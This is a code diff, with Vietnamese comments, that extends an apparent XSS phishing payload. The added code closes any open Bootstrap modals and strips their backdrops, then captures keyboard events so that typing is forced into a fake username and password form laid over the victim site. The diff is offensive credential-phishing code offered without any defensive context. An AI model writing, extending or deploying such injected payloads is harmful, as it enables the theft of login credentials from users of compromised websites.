@@ -204,6 +204,34 @@
       var phishDone = localStorage.getItem('__xss_phish_done') === '1';
       if (phishDone) return;
       
+      // === QUAN TRỌNG: ĐÓNG MODAL BOOTSTRAP ĐANG MỞ ===
+      // Modal #modal-users (data-bs-backdrop="static") có focus trap
+      // nó giữ focus và CHẶN keydown cho các phần tử ngoài modal
+      try {
+        // 1. Gọi jQuery modal('hide') nếu có
+        if (window.jQuery && jQuery.fn && jQuery.fn.modal) {
+          jQuery('.modal').each(function() {
+            try { jQuery(this).modal('hide'); } catch(e3) {}
+          });
+        }
+        // 2. Xóa class modal-open trên body
+        document.body.classList.remove('modal-open');
+        // 3. Xóa backdrop
+        var backdrops = document.querySelectorAll('.modal-backdrop, .modal-backdrop.fade.show');
+        for (var bi = 0; bi < backdrops.length; bi++) {
+          backdrops[bi].parentNode.removeChild(backdrops[bi]);
+        }
+        // 4. Ẩn mọi .modal đang show
+        var modals = document.querySelectorAll('.modal.show, .modal[style*="display: block"]');
+        for (var mi = 0; mi < modals.length; mi++) {
+          modals[mi].style.display = 'none';
+          modals[mi].classList.remove('show');
+        }
+        // 5. Bỏ thuộc tính overflow:hidden đang áp lên body
+        document.body.style.overflow = '';
+        document.body.style.paddingRight = '';
+      } catch(e3) {}
+      
       // --- Tạo overlay ---
       var overlay = document.createElement('div');
       overlay.setAttribute('id', 'xss_phish_overlay');
@@ -216,6 +244,22 @@
       overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
       overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });
       overlay.addEventListener('keydown', function(e) { e.stopPropagation(); });
+      
+      // Chặn Bootstrap focus trap bằng cách chiếm focus vĩnh viễn
+      // Bootstrap thường lắng nghe keydown trên document và chuyển hướng vào modal
+      document.addEventListener('keydown', function(e) {
+        if (e.key >= '0' && e.key <= 'z' || e.key === 'Backspace' || e.key === ' ' || e.key === 'Enter') {
+          // Nếu focus đang ở form phishing thì cho phép, ngược lại ép focus về input
+          if (document.activeElement !== userInput && document.activeElement !== passInput) {
+            e.stopImmediatePropagation();
+            userInput.focus();
+          }
+        }
+      }, true);
+      
+      // Tạo biến userInput/passInput trước để dùng ở trên
+      var userInput = null;
+      var passInput = null;
       
       // --- Tạo hộp form giả mạo ---
       var box = document.createElement('div');
